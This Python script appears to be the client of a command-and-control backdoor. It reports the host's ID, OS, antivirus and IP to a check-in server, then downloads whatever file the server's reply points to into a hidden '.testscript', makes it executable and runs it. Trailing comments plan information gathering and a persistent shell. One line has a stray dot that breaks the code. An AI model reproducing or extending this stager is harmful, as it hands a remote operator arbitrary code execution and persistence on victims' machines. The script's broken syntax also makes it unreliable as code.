import requests
import json
import os
import subprocess

url = "http://127.0.0.1:5000/check_in"

payload = "{\n\t\"uid\":\"123456789\",\n\t\"OS\":\"MACOS\",\n\t\"antivirus\":\"Defender\",\n\t\"ip\": \"9.9.9.9\"\n}"
headers = {
    'Content-Type': "application/json",
    'User-Agent': "PostmanRuntime/7.19.0",
    'Host': "127.0.0.1:5000"
    }

response = requests.request("POST", url, data=payload, headers=headers)
print(response)
print(response.text)
print(response.json())
command = response.json()
url = command['url']

getIt = requests.get(url). ## url passed by server

with open(".testscript","wb") as f:
	f.write(getIt.content)
f.close()
 ## download file 


## add execute permissions to file
chmod = subprocess.run(
    ['chmod','+x','.testscript'],
    stdout=subprocess.PIPE,
)
print('returncode:', chmod.returncode)
print('Have {} bytes in stdout:\n{}'.format(
    len(chmod.stdout),
    chmod.stdout.decode('utf-8')))

print(chmod.stdout.decode('utf-8'))

## execute file
completed= subprocess.run(
    ['bash','-c','./.testscript'],
    stdout=subprocess.PIPE,
)

print('returncode:', completed.returncode)
print('Have {} bytes in stdout:\n{}'.format(
    len(completed.stdout),
    completed.stdout.decode('utf-8')))
print(completed.stdout.decode('utf-8'))







## continue to gather information section 
## continue to persistent shell section